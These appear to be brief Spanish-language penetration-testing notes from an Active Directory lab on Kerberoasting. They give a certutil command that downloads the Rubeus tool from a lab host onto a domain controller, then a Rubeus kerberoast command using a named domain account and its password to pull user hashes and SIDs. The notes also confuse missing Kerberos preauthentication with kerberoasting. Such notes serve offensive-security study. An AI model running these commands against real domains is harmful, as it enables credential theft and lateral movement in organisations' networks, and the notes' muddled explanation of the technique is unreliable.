Descargar el binario precompilado 

Nos levamos Rubeus al DC
Desde windows descargar algo mediante la consola

```
certutil.exe -f -urlcache -split http://192.168.94.100:8000/Rubeus-v2.2.0.exe
```

Lo ejecutamos con estas opciones y obtenemos tada la info del usuario que esta sin la autenticacion de kerberos por lo que es kerberosteabe, nos da  su hash, sid
```
Rubeus.exe kerberoast /creduser:savicorp.local\mvazquez /credpassword:P@ssword1
```